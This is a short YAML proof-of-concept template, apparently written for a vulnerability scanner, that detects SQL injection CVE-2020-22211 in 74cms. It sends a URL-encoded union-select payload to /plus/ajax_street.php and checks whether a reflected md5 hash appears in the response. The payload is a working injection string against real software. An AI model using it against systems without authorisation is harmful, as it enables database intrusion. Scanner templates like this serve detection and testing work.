name: poc-yaml-74cms-cve-2020-22211-sqli
binding: 29628b7b-9b82-4b0f-9f2f-7e52407144b1
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/blindkey/cve_like/issues/13
    vulnerability:
        id: CT-156832
        level: critical
transport: http
set:
    rand: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{rand}}),9%23
        expression: |
            response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
expression: r0()
